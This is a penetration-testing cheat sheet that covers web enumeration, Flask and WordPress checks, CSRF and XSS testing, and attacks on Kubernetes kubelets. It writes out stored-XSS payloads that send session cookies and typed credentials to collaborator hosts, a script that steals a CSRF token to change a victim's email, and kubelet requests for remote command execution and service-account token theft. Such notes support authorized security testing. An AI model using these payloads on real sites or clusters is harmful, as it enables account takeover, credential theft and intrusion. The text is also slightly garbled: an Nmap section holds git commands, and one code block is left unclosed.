## Scanning/Enumeration
### Tools
- Nmap 
- Nikto
- Dirbuster
- Dirb
- Gobuster

### Nmap
```
git status
git add
git commit
```
### Fingerprinting

A very handy tool is Wappalyzer browser extension for a basic technology fingerprint. Then one can use [whatweb](https://github.com/urbanadventurer/WhatWeb).
```
./whatweb reddit.com
```
### Request manipulation 
In order to view all requests being made one can use Burp suite or view them directly from the browser with pressing
<kbd>F12</kbd> -> Network tab + <kbd>Shift</kbd> + <kbd>CTRL</kbd> + <kbd>R</kbd> 
### Gobuster

#### Directory enumeration
```
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -e -t 10
```
#### DNS subdomain enumeration
```
gobuster dns -d <domain_name> -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -t 20
```
#### LDAP 
Find public information about the ldap server:
```
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
## WEB
### Flask
If a flask application is tested there are some flask-specific things we should consider. In some flask installations the debug mode is left enabled and can be accessed at /console, which might enable RCE. Also, if tokens are used, flash-unsign can be used as described in [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask) to decode, bruteforce the secret key or forge a token. 

For a flask application directory listing, a specially crafted wordlist can be found [here](https://blog.r0b.re/assets/flask-wordlist.txt).
### Wordpress

- Run wpscan to gain basic information on the website.

- Check for installed plugins, themes and default pages.

- By default, the route /wp-json/wp/v2/user can list users. 

- Try bruteforcing the login page and see if lockout policy is implemented, if DoS is prevented via blocking or connection throttling. To test the lockout, try 100+ passwords and then try to login.

- Check all possible input fields around the page for client-side vulnerabilities (ex. XSS, CSRF)

- Check if XML-RPC is enabled. Issuing a POST request to /xmlrpc.php with the following payload should return all available methods (if enabled):
```
  <?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params>
    <param>
    </param>
  </params>
</methodCall>
```
If enabled various attacks can be tested, Pingback, code injection, bruteforce etc.

### CSRF

If csrf token is present:
- Change method of request from POST to GET
- Try removing the csrf token from request completely
- Check if csrf token is tied to user session. Check if a csrf token of a logged in user will be accepted when the request is made by another user. 

### XSS

#### Reflected XSS

- Bypassing filters - When tags are filtered, use Burp to enumerate custom tags that pass the check. Use this custom tag with an onfocus event or an available event with a certain id, ex. id=’x’ and the code #x in the end of the command in order focus on this element as soon as the page is loaded.

#### Stored XSS

- Getting the session cookie of a user
```
<script> 
fetch('https://727hmmjs30bdhtmvi7l0ww5m8de42vqk.oastify.com', 
{ method: 'POST', 
mode: 'no-cors', 
body:document.cookie }); 
</script>
```

- Getting the user’s username and password
```
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
- Forcing the user to issue a change mail request with a csrf token embedded
```
<script> var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() 
	{ var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
var changeReq = new XMLHttpRequest(); 
changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') };

### Kubernetes

Kubernetes dashboard is available at:
```
https://<IP>:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```
An interesting directory to look at, especially if anonymous authentication is not enabled is the following:
```
https://<IP>:10250/runningpods/
```
which lists all running pods and information about them.

In order to check for RCE inside pods, one  can try to issue the following request:
```
curl -k -XPOST "https://<IP>:10250/run/<namespace>/<pod>/<container>" -d “cmd=<command>"
```
In order to interact with the Kubernetes kubelet there is a tool called [Kubeletctl](https://github.com/cyberark/kubeletctl). By issuing the following command one can execute commands into a pod.
```
kubeletctl -s <IP> exec "/bin/bash" -p nginx -c nginx
```
Interesting file locations inside a kubernetes pod:
- The locations of the ServiceAccount object, which is managed by Kubernets and provides identity within the pod
```
    /run/secrets/kubernetes.io/serviceaccount
    /var/run/secrets/kubernetes.io/serviceaccount
    /secrets/kubernetes.io/serviceaccout
```
With the kubectl one can interact with the kubernetes cluster. With the following command the capabilities of the specified user in the token can be listed:
```
kubectl auth can-i --list --token $(cat ./token) -s https://<IP>:8443 --certificate-authority ca.crt -n default
```
